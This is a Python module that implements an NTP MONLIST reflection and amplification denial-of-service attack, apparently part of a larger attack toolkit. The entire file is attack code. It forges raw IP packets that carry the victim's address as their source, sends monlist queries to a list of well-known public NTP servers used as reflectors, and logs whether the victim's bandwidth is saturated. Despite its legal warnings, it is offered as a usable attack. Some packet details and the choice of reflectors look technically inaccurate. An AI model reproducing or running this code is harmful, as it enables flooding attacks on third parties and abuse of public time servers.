"""
NTP MONLIST Amplification Attack - 500x Bandwidth Amplification
==============================================================

DANGER LEVEL: EXTREME
- 8 bytes input → 4 KB output (500x amplification)
- UDP storm saturates victim's routers and firewalls
- Generates terabit-class floods with modest attacker bandwidth
- Many networks block NTP monlist, but misconfigured servers exist

Real-World Impact:
- Responsible for some of the largest DDoS attacks in history
- Can saturate 10 Gbps+ links with minimal resources
- Often used to target entire ISPs and data centers
"""

import asyncio
import socket
import struct
import random
import time
from typing import Dict, Any, List
from common.logger import logger, stats_logger

class NtpMonlistAmplifier:
    """NTP MONLIST amplification attack for extreme bandwidth amplification."""
    
    def __init__(self, config: Dict[str, Any]):
        self.target = config['target']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        self.delay = config.get('delay', 0.001)
        
        # NTP reflector servers (public NTP servers that respond to monlist)
        # These are often misconfigured servers that still respond to monlist queries
        self.ntp_reflectors = self._load_ntp_reflectors()
        
        # NTP MONLIST query packet (8 bytes → 4KB response)
        self.ntp_monlist_packet = self._create_monlist_packet()
        
        self.stats = {
            'queries_sent': 0,
            'amplification_factor': 500,  # Conservative estimate
            'bandwidth_generated': 0,
            'reflectors_used': 0,
            'errors': 0
        }

    def _load_ntp_reflectors(self) -> List[str]:
        """Load list of NTP servers that respond to monlist queries."""
        # Common public NTP servers (some may be misconfigured)
        # WARNING: Using these for attacks is illegal and unethical
        reflectors = [
            # Major public NTP servers
            "pool.ntp.org",
            "time.nist.gov", 
            "time.google.com",
            "time.cloudflare.com",
            "time.apple.com",
            "time.windows.com",
            
            # Regional NTP servers
            "0.pool.ntp.org",
            "1.pool.ntp.org", 
            "2.pool.ntp.org",
            "3.pool.ntp.org",
            
            # University NTP servers
            "ntp.ubuntu.com",
            "ntp.debian.org",
            
            # Additional targets for testing
            "0.us.pool.ntp.org",
            "1.us.pool.ntp.org",
            "0.europe.pool.ntp.org",
            "0.asia.pool.ntp.org"
        ]
        
        logger.info(f"📡 Loaded {len(reflectors)} potential NTP reflectors")
        logger.warning("⚠️  LEGAL WARNING: Using public NTP servers for amplification is illegal")
        
        return reflectors

    def _create_monlist_packet(self) -> bytes:
        """Create NTP MONLIST query packet."""
        # NTP packet structure for MONLIST query
        # This is the ~8 byte packet that triggers ~4KB response
        
        # NTP header (8 bytes)
        li_vn_mode = 0x17      # LI=0, VN=2, Mode=7 (private)
        stratum = 0x00         # Stratum 0
        poll = 0x04            # Poll interval
        precision = 0x00       # Precision
        
        # Pack the header
        packet = struct.pack('!BBBB', li_vn_mode, stratum, poll, precision)
        packet += b'\x00' * 4  # Root delay, root dispersion padding
        
        # MONLIST request code (the dangerous part)
        packet += struct.pack('!I', 0x2a)  # MONLIST opcode
        
        return packet

    async def run(self):
        """Execute NTP MONLIST amplification attack."""
        logger.info(f"⏰💥 Starting NTP MONLIST AMPLIFICATION against {self.target}")
        logger.warning(f"⚠️  500x AMPLIFICATION: 8 bytes → 4KB per query")
        logger.warning(f"💀 EXTREME DANGER: Can generate {self.concurrency * 500}x bandwidth")
        logger.warning("🚨 ILLEGAL: NTP amplification attacks violate computer crime laws")
        
        start_time = time.time()
        
        # Update stats
        stats_logger.update_stats(
            target=self.target,
            vector='ntp_monlist_amplification',
            status='running'
        )
        
        try:
            # Create semaphore to control concurrency
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch attack tasks
            tasks = []
            while time.time() - start_time < self.duration:
                if len(tasks) < self.concurrency:
                    task = asyncio.create_task(
                        self._ntp_amplification_attack(semaphore)
                    )
                    tasks.append(task)
                
                # Clean up completed tasks
                tasks = [t for t in tasks if not t.done()]
                await asyncio.sleep(0.01)
            
            # Wait for remaining tasks
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                
        except Exception as e:
            logger.error(f"❌ NTP amplification failed: {e}")
        finally:
            self._log_attack_results()
            stats_logger.update_stats(status='completed')

    async def _ntp_amplification_attack(self, semaphore: asyncio.Semaphore):
        """Send NTP MONLIST query with spoofed source IP."""
        async with semaphore:
            try:
                # Select random NTP reflector
                reflector = random.choice(self.ntp_reflectors)
                
                # Create raw socket for IP spoofing
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Create spoofed IP packet targeting victim
                spoofed_packet = self._create_spoofed_ntp_packet(
                    self.target,      # Spoofed source (victim)
                    reflector,        # Destination (NTP server)
                    self.ntp_monlist_packet
                )
                
                # Send spoofed packet
                sock.sendto(spoofed_packet, (reflector, 123))
                sock.close()
                
                self.stats['queries_sent'] += 1
                self.stats['bandwidth_generated'] += 4096  # ~4KB response expected
                self.stats['reflectors_used'] = len(set([reflector] + [self.stats.get('last_reflector', '')]))
                self.stats['last_reflector'] = reflector
                
                logger.debug(f"📡 NTP query → {reflector} (victim: {self.target})")
                
            except PermissionError:
                # Fallback to regular UDP socket (no spoofing)
                logger.warning("⚠️  No raw socket permission, using regular UDP")
                await self._ntp_regular_amplification(reflector)
                
            except Exception as e:
                self.stats['errors'] += 1
                logger.debug(f"NTP amplification error: {e}")
            
            finally:
                await asyncio.sleep(self.delay)

    async def _ntp_regular_amplification(self, reflector: str):
        """Fallback NTP amplification without IP spoofing."""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1.0)
            
            # Send MONLIST query
            sock.sendto(self.ntp_monlist_packet, (reflector, 123))
            
            # Try to receive response (to measure amplification)
            try:
                response = sock.recv(4096)
                amplification = len(response) / len(self.ntp_monlist_packet)
                self.stats['amplification_factor'] = max(
                    self.stats['amplification_factor'], 
                    int(amplification)
                )
                logger.debug(f"📡 {reflector}: {amplification:.0f}x amplification")
            except socket.timeout:
                pass  # No response expected if server doesn't support monlist
            
            sock.close()
            self.stats['queries_sent'] += 1
            
        except Exception as e:
            logger.debug(f"Regular NTP query failed: {e}")

    def _create_spoofed_ntp_packet(self, victim_ip: str, reflector_ip: str, ntp_payload: bytes) -> bytes:
        """Create spoofed IP+UDP+NTP packet."""
        # IP Header
        version = 4
        ihl = 5
        tos = 0
        tot_len = 20 + 8 + len(ntp_payload)  # IP + UDP + NTP
        id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        check = 0  # Will be calculated by kernel
        saddr = socket.inet_aton(victim_ip)     # Spoofed source (victim)
        daddr = socket.inet_aton(reflector_ip)  # Destination (NTP server)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl, tos, tot_len, id, frag_off,
                               ttl, protocol, check, saddr, daddr)
        
        # UDP Header
        sport = random.randint(1024, 65535)  # Random source port
        dport = 123  # NTP port
        udp_len = 8 + len(ntp_payload)
        udp_check = 0  # Simplified - no checksum
        
        udp_header = struct.pack('!HHHH', sport, dport, udp_len, udp_check)
        
        return ip_header + udp_header + ntp_payload

    def _log_attack_results(self):
        """Log the results of NTP amplification attack."""
        queries = self.stats['queries_sent']
        bandwidth = self.stats['bandwidth_generated']
        amplification = self.stats['amplification_factor']
        reflectors = self.stats['reflectors_used']
        
        logger.info("⏰💥 NTP MONLIST AMPLIFICATION RESULTS:")
        logger.info(f"   📡 Queries Sent: {queries:,}")
        logger.info(f"   📊 Amplification Factor: {amplification}x")
        logger.info(f"   💾 Bandwidth Generated: {bandwidth / 1024 / 1024:.1f} MB")
        logger.info(f"   🌐 Reflectors Used: {reflectors}")
        
        if amplification > 100:
            logger.warning(f"💀 HIGH AMPLIFICATION: {amplification}x - Victim bandwidth likely saturated")
        if bandwidth > 100 * 1024 * 1024:  # 100 MB
            logger.warning("🔥 MASSIVE BANDWIDTH GENERATED - Victim infrastructure likely overwhelmed")
        
        theoretical_bandwidth = queries * amplification * 8  # bytes
        logger.info(f"   ⚡ Theoretical Bandwidth: {theoretical_bandwidth / 1024 / 1024:.1f} MB")
        
        # Update global stats
        stats_logger.update_stats(
            packets_sent=queries,
            data_transmitted=bandwidth,
            attack_effectiveness=min(100, amplification // 5)
        )
